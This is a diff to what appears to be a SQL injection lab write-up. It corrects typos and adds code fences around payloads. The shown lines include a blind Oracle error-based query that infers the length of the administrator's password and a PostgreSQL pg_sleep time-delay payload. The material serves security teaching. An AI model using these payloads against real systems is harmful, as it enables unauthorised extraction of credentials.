@@ -690,11 +690,11 @@ Since administrator is a valid username, it returns `500 internal error`.
 
 ![](/assets/images/SQLi/Pasted%20image%2020250930173947.png)
 
-We can change the `administrator` to `administrator`. Now it returns `200 OK`.
+We can change the `administrator` to `admin`. Now it returns `200 OK`.
 
 ![](/assets/images/SQLi/Pasted%20image%2020250930173919.png)
 
-Now we use this query to determine the lenght of the password.
+Now we use this query to determine the length of the password.
 
 ```
 '||(SELECT CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username='administrator')=X) THEN TO_CHAR(1/0) ELSE '' END FROM dual)-- -
@@ -784,8 +784,9 @@ Logging in with these credentials will solve the lab.
 
 Payload that worked:
 
+```
 '||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--
-
+```
 Explanation:
 
 We use the following payload to trigger a 10 second delay. If the condition is true, then there should be a delay, which becomes true.
